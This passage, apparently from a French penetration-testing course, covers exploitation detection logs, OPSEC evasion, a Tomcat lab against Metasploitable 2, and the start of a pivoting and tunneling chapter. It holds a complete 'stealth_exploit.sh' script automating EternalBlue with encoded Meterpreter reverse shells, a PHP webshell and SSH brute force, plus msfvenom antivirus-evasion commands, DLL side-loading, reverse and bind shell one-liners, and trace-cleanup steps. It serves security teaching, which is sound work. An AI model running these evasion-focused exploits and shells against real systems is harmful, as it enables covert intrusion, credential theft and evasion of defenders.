   Token Elevation Type: TokenElevationTypeFull (2)
   Creator Process Name: C:\Windows\explorer.exe
   Process Command Line: cmd.exe /c powershell -e JABjAGwAaQBlAG4AdAA...
   ```

3. **Logs d'application**
   - Erreurs d'application inhabituelles
   - Tentatives d'exploitation échouées
   - Accès à des ressources protégées
   
   **Exemple de log Apache :**
   ```
   [Wed May 15 14:23:45 2023] [error] [client 192.168.1.100] PHP Fatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes) in /var/www/html/upload.php on line 42
   ```

#### Détection par les systèmes de sécurité

1. **IDS/IPS**
   - Détection de signatures d'exploits connus
   - Détection de payloads Metasploit
   - Détection de comportements anormaux
   
   **Exemple d'alerte Snort :**
   ```
   [**] [1:1000001:1] EXPLOIT MS17-010 EternalBlue attempt [**]
   [Classification: Attempted Administrator Privilege Gain] [Priority: 1]
   05/15-14:23:45.123456 192.168.1.100:4444 -> 192.168.1.10:445
   TCP TTL:64 TOS:0x0 ID:12345 IpLen:20 DgmLen:1234
   ***AP*** Seq: 0x12345678 Ack: 0x87654321 Win: 0x1000 TcpLen: 20
   [Xref => http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144]
   ```

2. **Antivirus/EDR**
   - Détection de payloads malveillants
   - Détection de comportements suspects (injection de processus, etc.)
   - Détection de techniques d'évasion
   
   **Exemple d'alerte Windows Defender :**
   ```
   Threat detected: Backdoor:Win32/Meterpreter
   Status: Blocked
   Path: C:\Users\User\Downloads\payload.exe
   ```

3. **SIEM**
   - Corrélation d'événements suspects
   - Détection de patterns d'attaque
   - Alertes basées sur des règles personnalisées
   
   **Exemple d'alerte SIEM :**
   ```
   [ALERT] Potential Metasploit Activity Detected
   Source IP: 192.168.1.100
   Target: 192.168.1.10
   Time: 2023-05-15 14:23:45
   Details: Multiple indicators of compromise detected:
   - Suspicious PowerShell command with base64 encoding
   - Connection to unusual port (4444)
   - Process spawning pattern consistent with Meterpreter
   Severity: High
   ```

#### Alertes SIEM typiques

**Alerte d'exploitation :**
```
[ALERT] Exploitation Attempt Detected
Source IP: 192.168.1.100
Target: 192.168.1.10:445
Time: 2023-05-15 14:23:45
Details: MS17-010 EternalBlue exploitation pattern detected
Severity: Critical
```

**Alerte de reverse shell :**
```
[ALERT] Reverse Shell Connection Detected
Source IP: 192.168.1.10
Destination IP: 192.168.1.100
Destination Port: 4444
Time: 2023-05-15 14:25:12
Details: Outbound connection from server to client on suspicious port
Severity: High
```

**Alerte de post-exploitation :**
```
[ALERT] Post-Exploitation Activity Detected
Host: 192.168.1.10
Time: 2023-05-15 14:30:45
Details: Multiple privilege escalation attempts followed by credential dumping activity
Severity: Critical
```

### Pièges classiques et erreurs à éviter

#### Erreurs techniques

1. **Mauvaise configuration des exploits**
   - Paramètres incorrects (LHOST, RHOST, etc.)
   - Payload incompatible avec la cible
   - Mauvaise gestion des sessions
   
   **Solution :** Vérifiez toujours les options requises avec `show options` et testez les exploits dans un environnement contrôlé avant de les utiliser en production.

2. **Instabilité des exploits**
   - Crash des services ciblés
   - Plantage du système d'exploitation
   - Perte de connexion après exploitation
   
   **Solution :** Privilégiez les exploits stables et testés, ayez un plan de secours en cas d'échec, et documentez toutes vos actions.

3. **Problèmes de connectivité**
   - Pare-feu bloquant les connexions
   - NAT empêchant les reverse shells
   - Problèmes de routage
   
   **Solution :** Testez la connectivité avant l'exploitation, utilisez des ports couramment autorisés (80, 443), et préparez plusieurs méthodes de connexion.

#### Erreurs OPSEC

1. **Signature évidente**
   - Utilisation de payloads Metasploit non modifiés
   - Connexions directes depuis l'IP de l'attaquant
   - Utilisation de ports par défaut (4444, 5555)
   
   **Solution :** Modifiez les payloads, utilisez des proxies, et évitez les ports par défaut.

2. **Bruit excessif**
   - Scans agressifs avant exploitation
   - Tentatives d'exploitation multiples et rapides
   - Génération de nombreuses erreurs
   
   **Solution :** Adoptez une approche plus discrète, espacez vos actions, et limitez les tentatives d'exploitation.

3. **Traces persistantes**
   - Fichiers laissés sur le système
   - Comptes créés et non supprimés
   - Modifications de configuration non restaurées
   
   **Solution :** Documentez toutes vos actions, nettoyez après vous, et vérifiez que vous n'avez pas laissé de traces.

### OPSEC Tips : exploitation discrète

#### Techniques de base

1. **Modification des payloads**
   ```bash
   # Encodage du payload
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o encoded_payload.exe
   
   # Utilisation de ports légitimes
   msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe -o https_payload.exe
   ```

2. **Utilisation de proxies**
   ```bash
   # Configuration d'un proxy SSH
   ssh -D 1080 user@pivot_host
   
   # Configuration de proxychains
   echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
   
   # Utilisation de proxychains avec Metasploit
   proxychains msfconsole
   ```

3. **Limitation du bruit**
   ```bash
   # Configuration de Metasploit pour être plus discret
   msf6 > set ConsoleLogging false
   msf6 > set SessionLogging false
   
   # Limitation des tentatives
   msf6 exploit(windows/smb/ms17_010_eternalblue) > set MaxAttempts 1
   
   # Utilisation de délais
   msf6 exploit(windows/smb/ms17_010_eternalblue) > set WfsDelay 30
   ```

#### Techniques avancées

1. **Personnalisation des payloads**
   ```bash
   # Création d'un payload personnalisé
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=443 -f c
   
   # Intégration dans un programme légitime
   # Utilisez un IDE pour créer une application qui intègre le shellcode
   ```

2. **Utilisation de C2 (Command and Control) alternatifs**
   ```bash
   # Utilisation de Covenant au lieu de Metasploit
   # Installation de Covenant
   git clone --recurse-submodules https://github.com/cobbr/Covenant
   cd Covenant/Covenant
   dotnet run
   
   # Accès à l'interface web sur https://localhost:7443
   # Création d'un listener et d'un Grunt
   ```

3. **Techniques d'évasion avancées**
   ```bash
   # Utilisation de DLL Side-Loading
   # Création d'une DLL malveillante
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=443 -f dll -o legitimate.dll
   
   # Placement à côté d'un exécutable légitime qui charge cette DLL
   ```

#### Script d'exploitation OPSEC

Voici un exemple de script pour réaliser une exploitation discrète :

```bash
#!/bin/bash
# stealth_exploit.sh - Exploitation discrète avec techniques OPSEC

if [ $# -lt 2 ]; then
    echo "Usage: $0 <target_ip> <exploit_type> [output_dir]"
    echo "Exploit types: eternalblue, webshell, ssh"
    exit 1
fi

TARGET=$1
EXPLOIT_TYPE=$2
OUTPUT_DIR=${3:-"stealth_exploit_$(date +%Y%m%d_%H%M%S)"}

mkdir -p "$OUTPUT_DIR"
echo "[+] Démarrage de l'exploitation discrète sur $TARGET"
echo "[+] Les résultats seront enregistrés dans $OUTPUT_DIR"

# Configuration des variables
LHOST=$(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
LPORT=443  # Port légitime pour éviter les détections

# Fonction pour exécuter une commande avec délai aléatoire
run_cmd() {
    local cmd=$1
    local outfile=$2
    local min_delay=$3
    local max_delay=$4
    
    echo "[*] Exécution de: $cmd"
    eval "$cmd" > "$OUTPUT_DIR/$outfile" 2>&1
    echo "[+] Résultats enregistrés dans $OUTPUT_DIR/$outfile"
    
    # Délai aléatoire
    local delay=$((RANDOM % (max_delay - min_delay + 1) + min_delay))
    echo "[*] Pause de $delay secondes..."
    sleep $delay
}

# Fonction pour configurer un handler Metasploit
setup_handler() {
    local payload=$1
    local lport=$2
    
    echo "[*] Configuration du handler pour $payload sur le port $lport"
    
    cat > "$OUTPUT_DIR/handler.rc" << EOF
use exploit/multi/handler
set PAYLOAD $payload
set LHOST $LHOST
set LPORT $lport
set ExitOnSession false
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
exploit -j
EOF
    
    # Lancement du handler en arrière-plan
    msfconsole -q -r "$OUTPUT_DIR/handler.rc" &
    HANDLER_PID=$!
    echo "[+] Handler lancé avec PID $HANDLER_PID"
}

# Phase 1: Préparation
echo "[*] Phase 1: Préparation..."

# Vérification discrète de la cible
run_cmd "nmap -sS -T2 -p 445,80,22 $TARGET -oN $OUTPUT_DIR/scan.txt" "01_scan.txt" 5 10

# Phase 2: Exploitation selon le type
echo "[*] Phase 2: Exploitation..."

case "$EXPLOIT_TYPE" in
    eternalblue)
        echo "[*] Exploitation EternalBlue discrète..."
        
        # Génération d'un payload encodé
        run_cmd "msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x86/shikata_ga_nai -i 10 -f exe -o $OUTPUT_DIR/payload.exe" "02_payload_gen.txt" 5 10
        
        # Configuration du handler
        setup_handler "windows/meterpreter/reverse_tcp" $LPORT
        
        # Création du script d'exploitation
        cat > "$OUTPUT_DIR/exploit.rc" << EOF
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $TARGET
set LHOST $LHOST
set LPORT $LPORT
set PAYLOAD windows/meterpreter/reverse_tcp
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set MaxAttempts 1
set WfsDelay 30
exploit
EOF
        
        # Exécution de l'exploit
        run_cmd "msfconsole -q -r $OUTPUT_DIR/exploit.rc" "03_exploit.txt" 10 20
        ;;
        
    webshell)
        echo "[*] Déploiement de webshell discret..."
        
        # Génération d'un webshell obfusqué
        cat > "$OUTPUT_DIR/shell.php" << 'EOF'
<?php
$c = $_GET['c'];
if(isset($c) && !empty($c)) {
    $o = '';
    $d = 'passthru';
    $o = @$d($c);
    echo "<pre>$o</pre>";
}
?>
EOF
        
        # Configuration du handler
        setup_handler "php/meterpreter/reverse_tcp" $LPORT
        
        # Instructions pour le déploiement manuel
        echo "[!] Webshell généré dans $OUTPUT_DIR/shell.php"
        echo "[!] Déployez manuellement le webshell sur la cible"
        echo "[!] Accédez au webshell via: http://$TARGET/path/to/shell.php?c=id"
        ;;
        
    ssh)
        echo "[*] Exploitation SSH discrète..."
        
        # Test de connexion SSH avec des identifiants courants
        cat > "$OUTPUT_DIR/ssh_users.txt" << EOF
root
admin
user
ubuntu
debian
EOF
        
        cat > "$OUTPUT_DIR/ssh_passwords.txt" << EOF
password
admin
root
123456
qwerty
EOF
        
        # Tentative de connexion SSH discrète
        run_cmd "hydra -L $OUTPUT_DIR/ssh_users.txt -P $OUTPUT_DIR/ssh_passwords.txt -t 1 -f -o $OUTPUT_DIR/ssh_result.txt ssh://$TARGET" "04_ssh_brute.txt" 20 30
        
        # Vérification des résultats
        if grep -q "login:" "$OUTPUT_DIR/ssh_result.txt"; then
            echo "[+] Identifiants SSH trouvés:"
            grep "login:" "$OUTPUT_DIR/ssh_result.txt"
            
            # Extraction des identifiants
            SSH_USER=$(grep "login:" "$OUTPUT_DIR/ssh_result.txt" | cut -d ":" -f 5 | tr -d " ")
            SSH_PASS=$(grep "login:" "$OUTPUT_DIR/ssh_result.txt" | cut -d ":" -f 6 | tr -d " ")
            
            # Connexion SSH
            echo "[*] Connexion SSH avec $SSH_USER:$SSH_PASS"
            echo "ssh $SSH_USER@$TARGET" > "$OUTPUT_DIR/ssh_connect.sh"
            chmod +x "$OUTPUT_DIR/ssh_connect.sh"
        else
            echo "[-] Aucun identifiant SSH trouvé"
        fi
        ;;
        
    *)
        echo "[-] Type d'exploit non reconnu: $EXPLOIT_TYPE"
        echo "[-] Types supportés: eternalblue, webshell, ssh"
        exit 1
        ;;
esac

# Phase 3: Nettoyage
echo "[*] Phase 3: Instructions de nettoyage..."

cat > "$OUTPUT_DIR/cleanup_instructions.txt" << EOF
# Instructions de nettoyage

## Nettoyage côté attaquant
- Arrêtez le handler Metasploit: kill $HANDLER_PID
- Supprimez les fichiers temporaires: rm -rf $OUTPUT_DIR

## Nettoyage côté cible
- Supprimez les fichiers déployés (webshell, etc.)
- Vérifiez les processus suspects: ps aux | grep -i meterpreter
- Vérifiez les connexions réseau: netstat -tuln
- Restaurez les configurations modifiées
EOF

echo "[+] Exploitation discrète terminée. Instructions de nettoyage disponibles dans $OUTPUT_DIR/cleanup_instructions.txt"
```

### Points clés

- L'exploitation est un processus méthodique qui nécessite une préparation minutieuse et une compréhension approfondie des vulnérabilités.
- Metasploit Framework est un outil puissant qui facilite l'exploitation, mais son utilisation laisse des traces détectables.
- Les techniques d'obtention de shell (reverse shell, bind shell) sont essentielles pour interagir avec les systèmes compromis.
- Les activités d'exploitation génèrent des traces détectables par les équipes de sécurité défensive.
- Des techniques OPSEC appropriées permettent de réduire significativement la détectabilité des activités d'exploitation.
- La personnalisation des payloads, l'utilisation de proxies et la limitation du bruit sont des pratiques OPSEC essentielles.

### Mini-quiz (3 QCM)

1. **Quelle commande permet de générer un payload Meterpreter encodé pour Windows ?**
   - A) `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe`
   - B) `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe`
   - C) `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"`
   - D) `msfdb init && msfconsole`

   *Réponse : B*

2. **Quelle technique d'exploitation est la plus discrète du point de vue OPSEC ?**
   - A) Utilisation de Metasploit avec les paramètres par défaut
   - B) Scan Nmap complet suivi d'une exploitation automatisée
   - C) Utilisation d'un payload personnalisé sur un port légitime (443) via un proxy
   - D) Tentatives d'exploitation multiples et rapides

   *Réponse : C*

3. **Quelle commande permet d'améliorer un shell basique en shell interactif sur un système Linux ?**
   - A) `bash -i`
   - B) `python -c 'import pty; pty.spawn("/bin/bash")'`
   - C) `cmd.exe /c powershell`
   - D) `nc -e /bin/bash 192.168.1.100 4444`

   *Réponse : B*

### Lab/Exercice guidé : Exploitation discrète d'une machine vulnérable

#### Objectif
Exploiter une machine vulnérable (Metasploitable 2) en utilisant des techniques OPSEC pour minimiser la détection.

#### Prérequis
- Kali Linux
- Machine virtuelle Metasploitable 2
- Réseau isolé pour les tests

#### Étapes

1. **Préparation de l'environnement**

```bash
# Création du répertoire de travail
mkdir -p ~/pentest_labs/stealth_exploit
cd ~/pentest_labs/stealth_exploit

# Vérification de la connectivité avec la cible
ping -c 1 192.168.1.10  # Remplacez par l'IP de votre Metasploitable 2
```

2. **Reconnaissance discrète**

```bash
# Scan discret pour identifier les services
sudo nmap -sS -T2 -p 21,22,23,25,80,139,445,3306,5432,8180 192.168.1.10 -oN initial_scan.txt

# Analyse des résultats
grep "open" initial_scan.txt
```

3. **Identification d'une vulnérabilité exploitable**

```bash
# Vérification du service Tomcat
curl -s http://192.168.1.10:8180 | grep -i tomcat

# Vérification des identifiants par défaut
curl -s http://192.168.1.10:8180/manager/html -u tomcat:tomcat

# Si l'authentification échoue, essayez d'autres identifiants courants
for user in tomcat admin root; do
    for pass in tomcat admin root password; do
        echo -n "$user:$pass - "
        curl -s -o /dev/null -w "%{http_code}" http://192.168.1.10:8180/manager/html -u $user:$pass
        echo
        sleep 2  # Délai pour éviter la détection
    done
done
```

4. **Préparation de l'exploitation**

```bash
# Création d'un script de préparation
cat > prepare_exploit.sh << 'EOF'
#!/bin/bash
# Script de préparation pour exploitation discrète

# Configuration des variables
TARGET="192.168.1.10"
LHOST=$(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
LPORT=443  # Port légitime pour éviter les détections

# Génération d'un payload WAR encodé
echo "[*] Génération du payload WAR..."
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o payload.war

# Configuration du handler Metasploit
echo "[*] Configuration du handler Metasploit..."
cat > handler.rc << EOL
use exploit/multi/handler
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding true
exploit -j
EOL

echo "[+] Préparation terminée"
echo "[+] Pour lancer le handler: msfconsole -q -r handler.rc"
echo "[+] Pour déployer le payload: curl -T payload.war http://$TARGET:8180/manager/html/upload -u tomcat:tomcat"
EOF

# Rendre le script exécutable et l'exécuter
chmod +x prepare_exploit.sh
./prepare_exploit.sh
```

5. **Exploitation discrète**

```bash
# Lancement du handler en arrière-plan
msfconsole -q -r handler.rc &

# Déploiement du payload avec délai
sleep 10  # Attente que le handler soit prêt
curl -T payload.war http://192.168.1.10:8180/manager/html/upload -u tomcat:tomcat

# Déclenchement du payload
curl http://192.168.1.10:8180/payload/
```

6. **Post-exploitation discrète**

```bash
# Dans la session obtenue, amélioration du shell
python -c 'import pty; pty.spawn("/bin/bash")'

# Collecte d'informations discrète
cat /etc/passwd | grep -v nologin | grep -v false
uname -a
cat /etc/issue

# Vérification des utilisateurs connectés
w

# Vérification des processus en cours
ps aux | grep root

# Recherche de fichiers intéressants
find /home -name "*.txt" 2>/dev/null
find /var/www -name "config*" 2>/dev/null
```

7. **Nettoyage des traces**

```bash
# Suppression du payload déployé
curl -s http://192.168.1.10:8180/manager/html/undeploy?path=/payload -u tomcat:tomcat

# Vérification de la suppression
curl -s -o /dev/null -w "%{http_code}" http://192.168.1.10:8180/payload/

# Nettoyage des fichiers locaux
rm payload.war handler.rc

# Arrêt du handler Metasploit
pkill -f "msfconsole -q -r handler.rc"
```

8. **Documentation des résultats**

```bash
# Création d'un rapport
cat > rapport.md << 'EOF'
# Rapport d'exploitation discrète

## Cible
- IP: 192.168.1.10
- Système: Metasploitable 2

## Vulnérabilité exploitée
- Service: Apache Tomcat 5.5
- Port: 8180
- Méthode: Upload de WAR via Manager
- Identifiants: tomcat:tomcat

## Techniques OPSEC utilisées
- Utilisation d'un port légitime (443)
- Scan limité et discret
- Délais entre les actions
- Nettoyage des traces

## Résultats
- Accès obtenu avec les privilèges de l'utilisateur tomcat
- Informations système collectées
- Payload supprimé après utilisation

## Recommandations
- Modifier les identifiants par défaut
- Désactiver le Manager si non utilisé
- Mettre à jour Tomcat vers une version récente
- Implémenter une authentification à deux facteurs
EOF
```

#### Vue Blue Team

Dans un environnement réel, cette approche discrète générerait moins d'alertes qu'une approche standard :

1. **Logs générés**
   - Quelques requêtes HTTP espacées dans le temps
   - Connexion authentifiée au Manager Tomcat
   - Upload d'un fichier WAR
   - Connexion sortante sur le port 443 (souvent autorisé)

2. **Alertes potentielles**
   - Détection de l'upload de WAR (si surveillé)
   - Détection de la connexion sortante (si anormale)
   - Détection du payload (si signature connue)

3. **Contre-mesures possibles**
   - Surveillance des uploads dans le Manager Tomcat
   - Analyse des fichiers WAR avant déploiement
   - Détection des connexions sortantes inhabituelles
   - Utilisation d'un WAF pour bloquer les payloads malveillants

#### Résultat attendu

À la fin de cet exercice, vous devriez :
- Avoir exploité avec succès une vulnérabilité dans Tomcat
- Comprendre comment minimiser les traces lors de l'exploitation
- Être capable d'améliorer un shell basique en shell interactif
- Apprécier l'importance des techniques OPSEC dans l'exploitation
- Avoir documenté l'ensemble du processus d'exploitation
# PARTIE II : PASSERELLE INTERMÉDIAIRE (+ OPSEC NIVEAU 2)

## Chapitre 9 : Pivoting & Tunneling

### Introduction : Pourquoi ce thème est important

Le pivoting et le tunneling sont des techniques essentielles pour tout pentester avancé. Dans un environnement réseau réel, les cibles les plus sensibles sont rarement directement accessibles depuis Internet. Elles sont généralement protégées par plusieurs couches de sécurité, notamment des pare-feu, des zones démilitarisées (DMZ) et une segmentation réseau. Le pivoting permet d'utiliser un système compromis comme point de rebond pour accéder à d'autres systèmes du réseau interne, tandis que le tunneling permet de créer des canaux de communication chiffrés à travers ces systèmes. Ces techniques sont cruciales pour progresser latéralement dans un réseau et atteindre des cibles à haute valeur. Ce chapitre vous enseignera les principes fondamentaux du pivoting et du tunneling, ainsi que les considérations OPSEC de niveau 2 pour minimiser la détection de ces activités.

### Principes du pivoting réseau

Le pivoting réseau consiste à utiliser un système compromis comme passerelle pour accéder à d'autres systèmes ou réseaux autrement inaccessibles.

#### Concepts fondamentaux

1. **Topologie réseau et segmentation**
   - Réseaux externes, DMZ et réseaux internes
   - Segmentation par VLAN, pare-feu et routage
   - Restrictions de communication entre segments

2. **Types de pivoting**
   - **Pivoting de port** : Redirection de ports spécifiques
   - **Pivoting de protocole** : Conversion entre différents protocoles
   - **Pivoting de réseau** : Routage du trafic vers d'autres réseaux
   - **Pivoting de proxy** : Utilisation d'un proxy SOCKS sur le système compromis

3. **Prérequis pour le pivoting**
   - Accès initial à un système (pivot)
   - Privilèges suffisants sur le système pivot
   - Connectivité du pivot vers les réseaux cibles
   - Absence de restrictions de sortie sur le pivot

#### Reconnaissance pour le pivoting

Avant d'établir un pivot, il est essentiel de comprendre la topologie du réseau cible.

1. **Identification des interfaces réseau**
   ```bash
   # Sur Linux
   ifconfig -a
   ip addr show
   
   # Sur Windows
   ipconfig /all
   Get-NetIPConfiguration
   ```

2. **Découverte des routes**
   ```bash
   # Sur Linux
   route -n
   ip route show
   
   # Sur Windows
   route print
   Get-NetRoute
   ```

3. **Découverte des hôtes et services**
   ```bash
   # Sur Linux
   ping -c 1 192.168.1.1-254
   for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip | grep "bytes from"; done
   
   # Avec Nmap (si disponible sur le pivot)
   nmap -sn 192.168.1.0/24
   nmap -sT -p 22,80,443,3389 192.168.1.0/24
   
   # Sur Windows
   for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | find "Reply"
   ```

4. **Analyse des connexions actives**
   ```bash
   # Sur Linux
   netstat -tuln
   ss -tuln
   
   # Sur Windows
   netstat -ano
   Get-NetTCPConnection
   ```

### Techniques de pivoting avec SSH

SSH est l'un des outils les plus puissants et sécurisés pour le pivoting, offrant plusieurs méthodes pour accéder à des réseaux distants.

#### Port forwarding local

Le port forwarding local permet de rediriger un port local vers un port distant via un serveur SSH intermédiaire.

```
Client (Attaquant) <-> Serveur SSH (Pivot) <-> Serveur cible
```

1. **Syntaxe de base**
   ```bash
   ssh -L [bind_address:]local_port:target_host:target_port user@pivot_host
   ```

2. **Exemples pratiques**
   ```bash
   # Redirection du port local 8080 vers le port 80 d'une machine interne
   ssh -L 8080:192.168.1.10:80 user@pivot.example.com
   
   # Accès à un serveur web interne
   # Après la commande ci-dessus, accédez à http://localhost:8080
   
   # Redirection du port local 3306 vers un serveur MySQL interne
   ssh -L 3306:db.internal:3306 user@pivot.example.com
   
   # Connexion au serveur MySQL
   mysql -h 127.0.0.1 -u root -p
   ```

3. **Redirection de plusieurs ports**
   ```bash
   # Redirection de plusieurs ports en une seule commande
   ssh -L 8080:web.internal:80 -L 3306:db.internal:3306 user@pivot.example.com
   ```

#### Port forwarding distant

Le port forwarding distant permet de rediriger un port du serveur SSH vers un port local ou distant.

```
Client (Attaquant) <-> Serveur SSH (Pivot) <-> Internet/Réseau externe
```

1. **Syntaxe de base**
   ```bash
   ssh -R [bind_address:]remote_port:target_host:target_port user@pivot_host
   ```

2. **Exemples pratiques**
   ```bash
   # Redirection du port 8080 du pivot vers le port 80 de l'attaquant
   ssh -R 8080:localhost:80 user@pivot.example.com
   
   # Exposition d'un service local à travers le pivot
   # Démarrez d'abord un service sur votre machine locale (port 80)
   python3 -m http.server 80
   
   # Puis établissez le tunnel
   ssh -R 8080:localhost:80 user@pivot.example.com
   
   # Sur le pivot, accédez à http://localhost:8080
   ```

3. **Exposition de services à d'autres machines**
   ```bash
   # Par défaut, les redirections sont liées à localhost sur le pivot
   # Pour les rendre accessibles depuis d'autres machines
   ssh -R 0.0.0.0:8080:localhost:80 user@pivot.example.com
   
   # Nécessite GatewayPorts yes dans sshd_config sur le pivot
   ```

#### Proxy dynamique (SOCKS)

Le proxy dynamique crée un proxy SOCKS sur un port local, permettant de router tout le trafic à travers le serveur SSH.

1. **Syntaxe de base**
   ```bash
   ssh -D [bind_address:]local_port user@pivot_host
   ```

2. **Exemples pratiques**
   ```bash
   # Création d'un proxy SOCKS sur le port 1080
   ssh -D 1080 user@pivot.example.com
   
   # Configuration de Firefox pour utiliser le proxy
   # Préférences > Réseau > Paramètres > Configuration manuelle du proxy
   # SOCKS Host: 127.0.0.1, Port: 1080
   
   # Utilisation avec curl
   curl --socks5 127.0.0.1:1080 http://internal-website.local
   
   # Utilisation avec Nmap
   nmap -sT -Pn -n -sV --proxies socks4://127.0.0.1:1080 192.168.1.0/24
   ```

3. **Proxy avec ProxyChains**
   ```bash
   # Configuration de ProxyChains
   echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
   
   # Utilisation avec différents outils
   proxychains firefox
   proxychains nmap -sT -Pn 192.168.1.10
   proxychains mysql -h 192.168.1.10 -u root -p
   ```

#### Tunneling SSH à travers SSH

Il est possible de chaîner plusieurs tunnels SSH pour traverser plusieurs segments réseau.

```
Client (Attaquant) <-> Pivot 1 <-> Pivot 2 <-> Cible
```

1. **Approche en deux étapes**
   ```bash
   # Étape 1: Établir un tunnel vers le premier pivot
   ssh -L 2222:pivot2.internal:22 user@pivot1.example.com
   
   # Étape 2: Utiliser le tunnel pour accéder au deuxième pivot
   ssh -L 8080:target.internal:80 -p 2222 user@localhost
   ```

2. **Approche avec ProxyJump (SSH 7.3+)**
   ```bash
   # Configuration dans ~/.ssh/config
   Host pivot1
       HostName pivot1.example.com
       User user1
   
   Host pivot2
       HostName pivot2.internal
       User user2
       ProxyJump pivot1
   
   Host target
       HostName target.internal
       User user3
       ProxyJump pivot2
   
   # Connexion directe à la cible à travers les pivots
   ssh target
   
   # Ou avec la commande directe
   ssh -J user1@pivot1.example.com,user2@pivot2.internal user3@target.internal
   ```

### Techniques de pivoting avec Metasploit

Metasploit offre plusieurs fonctionnalités puissantes pour le pivoting à travers des sessions compromises.

#### Configuration de routes

1. **Ajout de routes via une session Meterpreter**
   ```
   # Dans msfconsole, après avoir obtenu une session Meterpreter
   meterpreter > run autoroute -s 192.168.1.0/24
   
   # Ou depuis le prompt msf
   msf6 > route add 192.168.1.0/24 1  # où 1 est l'ID de la session
   
   # Vérification des routes
   msf6 > route print
   ```

2. **Utilisation des routes pour les modules Metasploit**
   ```
   # Scan d'un hôte interne
   msf6 > use auxiliary/scanner/portscan/tcp
   msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.10
   msf6 auxiliary(scanner/portscan/tcp) > set PORTS 22,80,443,3389
   msf6 auxiliary(scanner/portscan/tcp) > run
   
   # Exploitation d'un hôte interne
   msf6 > use exploit/windows/smb/ms17_010_eternalblue
   msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.10
   msf6 exploit(windows/smb/ms17_010_eternalblue) > run
   ```

#### Serveur proxy SOCKS

1. **Démarrage d'un serveur proxy SOCKS**
   ```
   # Utilisation du module socks_proxy
   msf6 > use auxiliary/server/socks_proxy
   msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
   msf6 auxiliary(server/socks_proxy) > set VERSION 5
   msf6 auxiliary(server/socks_proxy) > run -j
   ```

2. **Utilisation avec ProxyChains**
   ```bash
   # Configuration de ProxyChains
   echo "socks5 127.0.0.1 1080" > /etc/proxychains.conf
   
   # Utilisation avec différents outils
   proxychains nmap -sT -Pn 192.168.1.10
   proxychains firefox
   ```

#### Port forwarding avec Meterpreter

1. **Port forwarding avec portfwd**
   ```
   # Redirection d'un port local vers un port distant
   meterpreter > portfwd add -l 8080 -r 192.168.1.10 -p 80
   
   # Vérification des redirections
   meterpreter > portfwd list
   
   # Suppression d'une redirection
   meterpreter > portfwd delete -l 8080
   ```

2. **Reverse port forwarding**
   ```
   # Redirection d'un port distant vers un port local
   meterpreter > portfwd add -R -l 8080 -p 80 -L 192.168.1.100
   
   # Où 192.168.1.100 est l'adresse IP de l'attaquant
   ```

### Outils spécialisés de tunneling

Plusieurs outils spécialisés offrent des fonctionnalités avancées de tunneling, particulièrement utiles lorsque SSH n'est pas disponible.

#### Socat

Socat est un outil polyvalent pour le transfert de données bidirectionnel entre deux canaux indépendants.

1. **Installation**
   ```bash
   # Sur Debian/Ubuntu
   apt-get install socat
   
   # Sur RHEL/CentOS
   yum install socat
   ```

2. **Port forwarding simple**
   ```bash
   # Redirection du port local 8080 vers un port distant
   socat TCP-LISTEN:8080,fork TCP:192.168.1.10:80
   
   # Redirection avec spécification d'interface
   socat TCP-LISTEN:8080,bind=192.168.1.100,fork TCP:192.168.1.10:80
   ```

3. **Création d'un tunnel chiffré**
   ```bash
   # Sur le serveur (pivot)
   socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:internal-server:80
   
   # Sur le client (attaquant)
   socat TCP-LISTEN:8080,fork OPENSSL:pivot-server:443,verify=0
   
   # Accès au service via http://localhost:8080
   ```

4. **Relais UDP**
   ```bash
   # Redirection de trafic UDP
   socat UDP-LISTEN:53,fork UDP:192.168.1.10:53
   ```

5. **Création d'un shell distant**
   ```bash
   # Sur la cible
   socat TCP-LISTEN:4444,fork EXEC:/bin/bash,pty,stderr
   
   # Sur l'attaquant
   socat FILE:`tty`,raw,echo=0 TCP:target:4444
   ```

#### Chisel

Chisel est un outil de tunneling TCP/UDP rapide qui fonctionne à travers HTTP et est utile dans des environnements restrictifs.

1. **Installation**
   ```bash
   # Téléchargement des binaires
   wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
   gzip -d chisel_1.7.7_linux_amd64.gz
   chmod +x chisel_1.7.7_linux_amd64
   mv chisel_1.7.7_linux_amd64 chisel
   ```

2. **Port forwarding**
   ```bash
   # Sur le serveur (pivot)
   ./chisel server -p 8080 --reverse
   
   # Sur le client (attaquant)
   ./chisel client pivot-server:8080 R:8000:internal-server:80
   
   # Accès au service via http://localhost:8000
   ```

3. **Proxy SOCKS**
   ```bash
   # Sur le serveur (pivot)
   ./chisel server -p 8080 --reverse
   
   # Sur le client (attaquant)
